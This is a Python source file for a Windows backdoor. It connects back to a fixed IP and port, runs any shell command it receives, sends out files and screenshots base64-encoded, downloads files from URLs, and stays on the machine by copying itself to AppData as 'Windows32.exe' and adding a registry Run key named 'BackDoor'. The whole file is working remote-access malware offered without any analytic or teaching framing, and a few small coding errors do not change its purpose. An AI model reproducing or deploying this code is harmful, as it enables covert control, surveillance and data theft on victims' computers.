#!/usr/bin/python
 
import socket, subprocess, json, os, base64, shutil, sys, requests
from time import sleep
from mss import mss

def connection():
    while True:
        sleep.sleep(20)
        try:
            sock.connect(("192.168.1.10", 54321))
            shell()
        except:
            connection()

def reliable_send(data):
    json_data = json.dumps(str(data))
    sock.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def webdl(url):
    get_response = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as out_file:
        out_file.write(get_response.content)

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            print("Exiting.")
            break
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
            with open(command[7:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                webdl(command[4:])
                reliable_send("[+] Download from URL success")
            except:
                reliable_send("[!! Download failed")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                    os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to take screenshot")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

location = os.environ["AppData"] + "\\Windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)

# Create IPv4 TCP object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
sock.close()
